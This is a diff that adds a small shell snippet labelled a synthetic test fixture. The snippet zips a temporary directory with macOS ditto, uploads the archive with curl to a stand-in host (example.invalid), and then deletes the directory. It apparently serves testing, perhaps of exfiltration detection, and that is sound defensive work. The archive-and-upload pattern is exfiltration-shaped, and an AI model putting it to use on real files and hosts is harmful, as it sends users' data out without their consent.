@@ -1,0 +1,5 @@
+# SYNTHETIC TEST FIXTURE - not executable
+D=$(mktemp -d)
+ditto -c -k --sequesterRsrc "$D" /tmp/example-archive.zip
+curl -T /tmp/example-archive.zip https://example.invalid/upload
+rm -rf "$D"
